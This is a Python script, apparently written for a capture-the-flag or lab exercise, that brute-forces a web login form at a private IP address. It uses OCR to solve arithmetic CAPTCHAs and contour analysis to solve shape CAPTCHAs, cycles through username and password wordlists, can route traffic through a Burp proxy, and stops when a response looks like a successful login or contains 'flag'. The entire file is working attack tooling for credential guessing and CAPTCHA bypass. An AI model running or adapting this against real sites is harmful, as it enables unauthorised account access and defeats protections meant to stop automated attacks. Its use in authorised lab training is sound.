#!/usr/bin/env python3
import argparse
import base64
import operator
import re
from io import BytesIO
from pathlib import Path

import requests
from bs4 import BeautifulSoup
from PIL import Image

import cv2
import numpy as np
import pytesseract


OPS = {
    "+": operator.add,
    "-": operator.sub,
    "*": operator.mul,
    "/": lambda a, b: a // b,
}


def read_words(path):
    path = Path(path)
    if not path.exists():
        return []
    return [line.strip() for line in path.read_text().splitlines() if line.strip()]


def append_word(path, word, seen):
    if word in seen:
        return
    with Path(path).open("a", encoding="utf-8") as handle:
        handle.write(word + "\n")
    seen.add(word)


def pair_key(username, password):
    return f"{username}:{password}"


def page_text(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.get_text(" ", strip=True)


def extract_png(html):
    soup = BeautifulSoup(html, "html.parser")
    img = soup.find("img")
    if not img:
        return None

    src = img.get("src", "")
    prefix = "data:image/png;base64,"
    if not src.startswith(prefix):
        return None

    raw = base64.b64decode(src[len(prefix):])
    return Image.open(BytesIO(raw)).convert("RGB")


def solve_math_from_text(html):
    text = page_text(html)
    match = re.search(r"(\d+)\s*([+\-*/])\s*(\d+)\s*=\s*\?", text)
    if not match:
        return None

    a = int(match.group(1))
    op = match.group(2)
    b = int(match.group(3))
    return str(OPS[op](a, b))


def solve_math_from_image(html):
    image = extract_png(html)
    if image is None:
        return None

    arr = np.array(image)
    gray = cv2.cvtColor(arr, cv2.COLOR_RGB2GRAY)
    gray = cv2.resize(gray, None, fx=3, fy=3, interpolation=cv2.INTER_CUBIC)
    gray = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(gray, 180, 255, cv2.THRESH_BINARY)

    config = "--psm 7 -c tessedit_char_whitelist=0123456789+-*/=?"
    text = pytesseract.image_to_string(thresh, config=config)
    text = text.replace("x", "*").replace("X", "*")
    text = re.sub(r"[^0-9+\-*/= ?]", "", text)

    match = re.search(r"(\d+)\s*([+\-*/])\s*(\d+)", text)
    if not match:
        return None

    a = int(match.group(1))
    op = match.group(2)
    b = int(match.group(3))
    return str(OPS[op](a, b))


def solve_shape_from_image(html):
    image = extract_png(html)
    if image is None:
        return None

    arr = np.array(image)
    gray = cv2.cvtColor(arr, cv2.COLOR_RGB2GRAY)
    blurred = cv2.GaussianBlur(gray, (5, 5), 0)
    _, thresh = cv2.threshold(blurred, 245, 255, cv2.THRESH_BINARY_INV)

    contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    contours = [c for c in contours if cv2.contourArea(c) > 500]
    if not contours:
        return None

    contour = max(contours, key=cv2.contourArea)
    perimeter = cv2.arcLength(contour, True)
    approx = cv2.approxPolyDP(contour, 0.04 * perimeter, True)
    vertices = len(approx)

    if vertices == 3:
        return "triangle"

    if vertices == 4:
        x, y, w, h = cv2.boundingRect(approx)
        ratio = w / float(h)
        if 0.80 <= ratio <= 1.20:
            return "square"

    return "circle"


def solve_captcha(html):
    text = page_text(html).lower()

    if "describe the shape" in text:
        return solve_shape_from_image(html)

    answer = solve_math_from_text(html)
    if answer is not None:
        return answer

    return solve_math_from_image(html)


def captcha_active(html):
    text = page_text(html).lower()
    return (
        "detected 3 incorrect login attempts" in text
        or "you need to successfully solve" in text
        or "invalid captcha" in text
    )


def dump_captcha_debug(html):
    Path("debug_captcha.html").write_text(html, encoding="utf-8")
    image = extract_png(html)
    if image is not None:
        image.save("debug_captcha.png")


def clear_captcha(session, url, max_rounds=20):
    response = session.get(url, timeout=10)

    for round_no in range(1, max_rounds + 1):
        if not captcha_active(response.text):
            return response

        answer = solve_captcha(response.text)
        if not answer:
            dump_captcha_debug(response.text)
            raise RuntimeError("Could not solve CAPTCHA on current page")

        print(f"[captcha] round {round_no}: {answer}")
        response = session.post(url, data={"captcha": answer}, timeout=10)

    dump_captcha_debug(response.text)
    raise RuntimeError("CAPTCHA did not clear after max rounds")


def is_candidate(response):
    text = response.text.lower()
    if response.history:
        return True
    if any(word in text for word in ("dashboard", "logout", "welcome", "flag")):
        return True
    if "administrator login" not in text and "invalid captcha" not in text:
        return True
    return False


def build_attempts(users, passwords, mode):
    if mode == "clusterbomb":
        return [(username, password) for username in users for password in passwords]

    if len(users) != len(passwords):
        print(
            f"[!] pitchfork mode: usernames={len(users)} passwords={len(passwords)}; "
            f"using first {min(len(users), len(passwords))} pairs"
        )
    return list(zip(users, passwords))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://10.128.138.52/login")
    parser.add_argument("--users", default="usernames.txt")
    parser.add_argument("--passwords", default="passwords.txt")
    parser.add_argument("--exclude-pairs", default=None, help="skip username:password pairs listed in this file")
    parser.add_argument("--bad-pairs-out", default="bad_pairs.txt", help="write failed username:password pairs here")
    parser.add_argument(
        "--exclude-passwords",
        default=None,
        help="legacy option: skip every password listed in this file",
    )
    parser.add_argument(
        "--bad-passwords-out",
        default=None,
        help="legacy option: write failed passwords only; not recommended for clusterbomb mode",
    )
    parser.add_argument(
        "--mode",
        choices=("clusterbomb", "pitchfork"),
        default="clusterbomb",
        help="clusterbomb tries every username with every password; pitchfork pairs lines by index",
    )
    parser.add_argument("--captcha-rounds", type=int, default=20)
    parser.add_argument("--proxy", action="store_true", help="send traffic through Burp on 127.0.0.1:8080")
    args = parser.parse_args()

    users = read_words(args.users)
    passwords = read_words(args.passwords)
    excluded_passwords = set(read_words(args.exclude_passwords)) if args.exclude_passwords else set()
    if excluded_passwords:
        before = len(passwords)
        passwords = [password for password in passwords if password not in excluded_passwords]
        print(f"[*] excluded passwords: {before - len(passwords)} skipped, {len(passwords)} remaining")

    attempts = build_attempts(users, passwords, args.mode)
    excluded_pairs = set(read_words(args.exclude_pairs)) if args.exclude_pairs else set()
    if excluded_pairs:
        before = len(attempts)
        attempts = [(username, password) for username, password in attempts if pair_key(username, password) not in excluded_pairs]
        print(f"[*] excluded pairs: {before - len(attempts)} skipped, {len(attempts)} remaining")

    bad_pairs = set(read_words(args.bad_pairs_out))
    bad_passwords = set(read_words(args.bad_passwords_out)) if args.bad_passwords_out else set()

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    if args.proxy:
        session.proxies.update({
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        })
        session.verify = False

    total = len(attempts)
    count = 0

    print(f"[*] mode={args.mode} attempts={total}")
    for username, password in attempts:
        count += 1
        clear_captcha(session, args.url, max_rounds=args.captcha_rounds)

        response = session.post(
            args.url,
            data={"username": username, "password": password},
            timeout=10,
            allow_redirects=True,
        )

        marker = "candidate" if is_candidate(response) else "no"
        print(
            f"[{count:04d}/{total}] {username}:{password} "
            f"status={response.status_code} len={len(response.text)} {marker}"
        )

        if marker == "candidate":
            Path("candidate_response.html").write_text(response.text, encoding="utf-8")
            print(f"[+] possible hit: {username}:{password}")
            return

        append_word(args.bad_pairs_out, pair_key(username, password), bad_pairs)
        if args.bad_passwords_out:
            append_word(args.bad_passwords_out, password, bad_passwords)

    print("[-] no candidate found")


if __name__ == "__main__":
    main()
